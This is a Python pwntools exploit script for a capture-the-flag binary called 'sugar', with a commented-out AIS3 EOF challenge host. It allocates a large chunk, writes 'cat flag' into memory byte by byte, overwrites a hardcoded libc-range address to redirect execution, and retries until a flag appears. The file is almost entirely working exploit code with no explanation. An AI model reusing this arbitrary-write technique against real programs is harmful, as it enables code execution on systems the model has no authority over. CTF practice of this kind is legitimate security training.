from curses import raw
from pwn import *

elf = ELF('sugar')
# p = remote('chals1.eof.ais3.org', 45124)

def malloc(p, len):
    p.sendline(str(len).encode())

def write_str(p, idx, val):
    for i in range(len(val)):
        p.sendline(str(idx + i).encode() + b' ' + str(ord(val[i])).encode())

def write_addr(p, idx, val):
    addr = val
    for i in range(8):
        p.sendline(str(idx + i).encode() + b' ' + str(val & 0xff).encode())
        val >>= 8

while True:
    # p = elf.process()
    p = remote('0.0.0.0', 45124)
    malloc(p, 0x21000)
    p.sendline(b'-')
    write_str(p, 0, 'cat flag')
    write_addr(p, 0x210b18, 0x7ffff7e15410)
    p.sendline(b'1 -')

    try:
        data = p.recv()
        print(data)
        if b'FLAG' in data:
            raw_input()
            p.close()
            break
    except:
        p.close()